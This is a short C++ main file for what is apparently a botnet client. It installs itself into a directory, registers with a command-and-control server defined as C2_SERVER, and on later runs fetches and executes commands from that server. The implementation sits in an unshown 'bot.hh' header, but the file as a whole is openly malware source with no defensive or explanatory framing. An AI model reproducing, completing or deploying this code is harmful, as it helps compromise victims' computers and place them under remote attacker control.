#include <stdio.h>
#include <fstream>
#include <string>

#include "bot.hh"

int main() {
    std::string register_url, command_url, authfile_path, install_dir;

    install_dir = util::GetInstallDir();
    authfile_path = install_dir + AUTH_FILE;
    Bot host(authfile_path);

    register_url = C2_SERVER + REGISTER_URI;
    command_url = C2_SERVER + CMD_URI;

    if (host.IsInstalled()) {
        host.ExecuteCommand(command_url);
    } else {
        host.Install(install_dir);
        host.RegisterBot(register_url);
    }

    return 0;
}
